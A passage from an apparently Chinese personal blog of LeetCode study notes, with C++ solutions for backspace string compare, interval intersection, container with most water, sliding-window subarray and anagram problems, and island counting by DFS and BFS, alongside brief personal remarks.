class="number">0</span>)&#123;</span><br><span class="line">                    s1.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t_size;i++)&#123;</span><br><span class="line">            s2.push(t[i]);</span><br><span class="line">            <span class="keyword">if</span>(t[i]==<span class="string">'#'</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s2.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                    s2.pop();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s2.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                    s2.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(s1.<span class="built_in">size</span>()==<span class="number">0</span> &amp;&amp; s2.<span class="built_in">size</span>()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s1.<span class="built_in">size</span>()!=s2.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> len = s1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s1.top() == s2.top())&#123;</span><br><span class="line">                s1.pop();</span><br><span class="line">                s2.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"winter"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer1：重构字符串</p>
<blockquote>
<p>其实和我的思路是一样的，但是代码简介，，hhh</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">backspaceCompare</span><span class="params">(<span class="built_in">string</span> S, <span class="built_in">string</span> T)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> build(S) == build(T);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">build</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ret;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch : str) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch != <span class="string">'#'</span>) &#123;</span><br><span class="line">                ret.push_back(ch);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!ret.empty()) &#123;</span><br><span class="line">                ret.pop_back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer2</p>
<blockquote>
<p>双指针</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">backspaceCompare</span><span class="params">(<span class="built_in">string</span> S, <span class="built_in">string</span> T)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = S.length() - <span class="number">1</span>, j = T.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> skipS = <span class="number">0</span>, skipT = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//解决两个字符串的#</span></span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (S[i] == <span class="string">'#'</span>) &#123;</span><br><span class="line">                    skipS++, i--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (skipS &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    skipS--, i--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (T[j] == <span class="string">'#'</span>) &#123;</span><br><span class="line">                    skipT++, j--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (skipT &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    skipT--, j--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//没有#了，判断字符串是否相等</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (S[i] != T[j]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            i--, j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="986-区间列表的交集"><a href="#986-区间列表的交集" class="headerlink" title="986. 区间列表的交集"></a><a href="https://leetcode-cn.com/problems/interval-list-intersections/" target="_blank" rel="noopener">986. 区间列表的交集</a></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">intervalIntersection</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; firstList, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; secondList)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(firstList.<span class="built_in">size</span>() == <span class="number">0</span> || secondList.<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, l, r;</span><br><span class="line">        <span class="keyword">int</span> len1 = firstList.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> len2 = secondList.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len1 &amp;&amp; j &lt; len2)&#123;</span><br><span class="line">            l = <span class="built_in">max</span>(firstList[i][<span class="number">0</span>], secondList[j][<span class="number">0</span>]);</span><br><span class="line">            r = <span class="built_in">min</span>(firstList[i][<span class="number">1</span>], secondList[j][<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span>(l &lt;= r)&#123; <span class="comment">// 找到交集的情况</span></span><br><span class="line">                <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">                tmp.push_back(l);</span><br><span class="line">                tmp.push_back(r);</span><br><span class="line">                res.push_back(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 无论是否交汇，j中较小只都应该向前移动</span></span><br><span class="line">            <span class="keyword">if</span>(firstList[i][<span class="number">1</span>] == r)&#123;</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ++j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11. 盛最多水的容器"></a><a href="https://leetcode-cn.com/problems/container-with-most-water/" target="_blank" rel="noopener">11. 盛最多水的容器</a></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; <span class="built_in">height</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = <span class="built_in">height</span>.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            <span class="keyword">int</span> area = <span class="built_in">min</span>(<span class="built_in">height</span>[l], <span class="built_in">height</span>[r]) * (r - l);</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, area);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">height</span>[l] &lt;= <span class="built_in">height</span>[r]) &#123;</span><br><span class="line">                ++l;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                --r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>今天用ipad做的，结果找不到代码了，，，，就直接拿的答案，，，</p>
</blockquote>
<h1 id="第-5-天-滑动窗口"><a href="#第-5-天-滑动窗口" class="headerlink" title="第 5 天 滑动窗口"></a>第 5 天 滑动窗口</h1><h3 id="438-找到字符串中所有字母异位词"><a href="#438-找到字符串中所有字母异位词" class="headerlink" title="438. 找到字符串中所有字母异位词"></a><a href="https://leetcode-cn.com/problems/find-all-anagrams-in-a-string/" target="_blank" rel="noopener">438. 找到字符串中所有字母异位词</a></h3><blockquote>
<p>暴力算法，是真的很慢，hhh</p>
<p><img src="/2021/08/26/00-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210830201604705.png" alt="image-20210830201604705"></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">findAnagrams</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(s.length() &lt; p.length()) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">int</span> length = p.length();</span><br><span class="line">        <span class="comment">//暴力循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length()-p.length()+<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(isyiwei(s.substr(i,length),p))&#123;</span><br><span class="line">                res.push_back(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断是否是异味，主要是看每个字符的长度是不是一样</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isyiwei</span><span class="params">(<span class="built_in">string</span> str_a,<span class="built_in">string</span> str_b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">size</span> = str_a.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//一个+，一个-，除非str_a和str_b一样，返回true</span></span><br><span class="line">            num[str_a[i]-<span class="string">'a'</span>]+=<span class="number">1</span>;</span><br><span class="line">            num[str_b[i]-<span class="string">'a'</span>]-=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[i]!=<span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>保存，每次加上1位，减去一位</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">findAnagrams</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length_p = p.length();</span><br><span class="line">        <span class="keyword">int</span> length_s = s.length();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;res;</span><br><span class="line">        <span class="keyword">if</span>(length_p &gt; length_s) <span class="keyword">return</span> res;<span class="comment">//从长度</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//最开始</span></span><br><span class="line">        vector&lt;int&gt; temp_s(26,0),temp_p(26,0);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length_p;i++)&#123;</span><br><span class="line">            temp_p[p[i]-<span class="string">'a'</span>]++;</span><br><span class="line">            temp_s[s[i]-<span class="string">'a'</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp_p == temp_s) res.push_back(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环加上一位</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i+length_p&lt;length_s;i++)&#123;</span><br><span class="line">            <span class="comment">//去掉s[i]，换上s[i+length]，相当于滑动窗口的移动</span></span><br><span class="line">            temp_s[s[i]-<span class="string">'a'</span>]--;</span><br><span class="line">            temp_s[s[i+length_p]-<span class="string">'a'</span>]++;</span><br><span class="line">            <span class="keyword">if</span>(temp_p==temp_s)&#123;</span><br><span class="line">                res.push_back(i+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="713-乘积小于K的子数组"><a href="#713-乘积小于K的子数组" class="headerlink" title="713. 乘积小于K的子数组"></a><a href="https://leetcode-cn.com/problems/subarray-product-less-than-k/" target="_blank" rel="noopener">713. 乘积小于K的子数组</a></h3><p>由于题目要求是连续的子数组，所以很明显要用滑动窗口进行求解</p>
<p><img src="/2021/08/26/00-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210830203223375.png" alt="image-20210830203223375"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numSubarrayProductLessThanK</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&lt;=<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>,l=<span class="number">0</span>,r=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> windows_mul = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(r&lt;n)&#123;</span><br><span class="line">            windows_mul*=nums[r];</span><br><span class="line">            <span class="comment">//不满足条件，剔除左边的元素</span></span><br><span class="line">            <span class="keyword">while</span>(windows_mul&gt;=k)&#123;</span><br><span class="line">                windows_mul/=nums[l];</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//满足条件，加入右边的元素</span></span><br><span class="line">            res += (r-l+<span class="number">1</span>);</span><br><span class="line">            r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="209-长度最小的子数组"><a href="#209-长度最小的子数组" class="headerlink" title="209. 长度最小的子数组"></a><a href="https://leetcode-cn.com/problems/minimum-size-subarray-sum/" target="_blank" rel="noopener">209. 长度最小的子数组</a></h3><blockquote>
<p>暴力法</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> target, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;n;j++)&#123;</span><br><span class="line">                sum+=nums[j];</span><br><span class="line">                <span class="keyword">if</span>(sum &gt;= target)&#123;</span><br><span class="line">                    ans = <span class="built_in">min</span>(ans,j-i+<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans == INT_MAX ? <span class="number">0</span>:ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>滑动窗口</p>
<blockquote>
<p>我照着第二个进行了修改，差一点点，好吧，题目没好好看，找的是&gt;=的最小长度，wuwu</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> target, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res=INT_MAX,l=<span class="number">0</span>,r=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> cur_len;</span><br><span class="line">        <span class="keyword">int</span> windows_plus = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(r&lt;n)&#123;</span><br><span class="line">            windows_plus+=nums[r];</span><br><span class="line">            <span class="keyword">while</span>(windows_plus &gt;= target)&#123;</span><br><span class="line">                res = <span class="built_in">min</span>(res,r-l+<span class="number">1</span>);</span><br><span class="line">                windows_plus -= nums[l];</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == INT_MAX? <span class="number">0</span>: res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-6-天-广度优先搜索-深度优先搜索"><a href="#第-6-天-广度优先搜索-深度优先搜索" class="headerlink" title="第 6 天 广度优先搜索 / 深度优先搜索"></a>第 6 天 广度优先搜索 / 深度优先搜索</h1><h3 id="200-岛屿数量"><a href="#200-岛屿数量" class="headerlink" title="200. 岛屿数量"></a><a href="https://leetcode-cn.com/problems/number-of-islands/" target="_blank" rel="noopener">200. 岛屿数量</a></h3><blockquote>
<p>通过dfs，一次可以把一个岛屿置0，然后循环，找到1，则记作1个岛屿，把改岛屿置零</p>
<p>好像做过类似的题，，，，</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; grid,<span class="keyword">int</span> r,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nr = grid.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">int</span> nc = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">    grid[r][c]=<span class="string">'0'</span>;<span class="comment">//遍历过，置0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(r<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; grid[r<span class="number">-1</span>][c]==<span class="string">'1'</span>) dfs(grid,r<span class="number">-1</span>,c);</span><br><span class="line">    <span class="keyword">if</span>(r+<span class="number">1</span> &lt; nr &amp;&amp; grid[r+<span class="number">1</span>][c]==<span class="string">'1'</span>) dfs(grid,r+<span class="number">1</span>,c);</span><br><span class="line">    <span class="keyword">if</span>(c<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; grid[r][c<span class="number">-1</span>]==<span class="string">'1'</span>) dfs(grid,r,c<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(c+<span class="number">1</span> &lt; nc &amp;&amp; grid[r][c+<span class="number">1</span>]==<span class="string">'1'</span>) dfs(grid,r,c+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> nr = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(!nr) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> nc = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> num_island = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>;r&lt;nr;r++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">0</span>;c&lt;nc;c++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[r][c]==<span class="string">'1'</span>)&#123;</span><br><span class="line">                    ++num_island;</span><br><span class="line">                    dfs(grid,r,c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num_island;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>广度优先</p>
<p>其实和深度优先一样，找到一个1的时候，搜索所有相邻的置零</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> nr = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(!nr) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> nc = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> num_island = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>;r&lt;nr;r++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">0</span>;c&lt;nc;c++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[r][c]==<span class="string">'1'</span>)&#123;</span><br><span class="line">                    ++num_island;</span><br><span class="line">                    grid[r][c]=<span class="string">'0'</span>;</span><br><span class="line">                    <span class="built_in">queue</span>&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; neighbors;</span><br><span class="line">                    neighbors.push(&#123;r,c&#125;);</span><br><span class="line">                    <span class="keyword">while</span>(!neighbors.empty())&#123;</span><br><span class="line">                        <span class="keyword">auto</span> rc = neighbors.front();</span><br><span class="line">                        neighbors.pop();</span><br><span class="line">                        <span class="keyword">int</span> row = rc.first,col = rc.second;</span><br><span class="line">                        <span class="keyword">if</span>(row<span class="number">-1</span>&gt;=<span class="number">0</span> &amp;&amp; grid[row<span class="number">-1</span>][col]==<span class="string">'1'</span>)&#123;</span><br><span class="line">                            neighbors.push(&#123;row<span class="number">-1</span>,col&#125;);</span><br><span class="line">                            grid[row<span class="number">-1</span>][col]=<span class="string">'0'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(row+<span class="number">1</span>&lt;nr &amp;&amp; grid[row+<span class="number">1</span>][col]==<span class="string">'1'</span>)&#123;</span><br><span class="line">                            neighbors.push(&#123;row+<span class="number">1</span>,col&#125;);</span><br><span class="line">                            grid[row+<span class="number">1</span>][col]=<span class="string">'0'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(col<span class="number">-1</span>&gt;=<span class="number">0</span> &amp;&amp; grid[row][col<span class="number">-1</span>]==<span class="string">'1'</span>)&#123;</span><br><span class="line">                            neighbors.push(&#123;row,col<span class="number">-1</span>&#125;);</span><br><span class="line">                            grid[row][col<span class="number">-1</span>]=<span class="string">'0'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(col+<span class="number">1</span>&lt;nc &amp;&amp; grid[row][col+<span class="number">1</span>]==<span class="string">'1'</span>)&#123;</span><br><span class="line">                            neighbors.push(&#123;row,col+<span class="number">1</span>&#125;);</span><br><span class="line">                            grid[row][col+<span class="number">1</span>]=<span class="string">'0'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num_island;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h4><blockquote>
<p>发现是一种new算法，没做过的</p>
<p>通过看了视频学习了一下，讲的真好（鼓掌）</p>
<p><a href="https://www.bilibili.com/video/BV13t411v7Fs?from=search&amp;seid=7042952233023491726" target="_blank" rel="noopener">视频链接</a></p>
</blockquote>
